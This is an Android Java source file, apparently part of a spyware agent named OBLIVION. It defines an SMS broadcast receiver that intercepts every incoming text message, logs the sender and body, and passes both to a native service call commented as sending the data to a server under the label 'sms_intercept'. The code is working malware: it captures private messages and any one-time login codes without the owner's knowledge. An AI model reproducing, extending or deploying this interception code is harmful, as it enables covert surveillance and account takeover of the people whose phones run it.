package com.OBLIVION.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = message.getDisplayOriginatingAddress();
                        String body = message.getMessageBody();
                        
                        // Log intercepted SMS
                        Log.d("OBLIVIONSMS", "SMS from: " + sender + " - " + body);
                        
                        // Send to server
                        OBLIVIONService service = new OBLIVIONService();
                        service.nativeSendData("sms_intercept", "{\"sender\":\"" + sender + "\",\"body\":\"" + body + "\"}");
                    }
                }
            }
        }
    }
}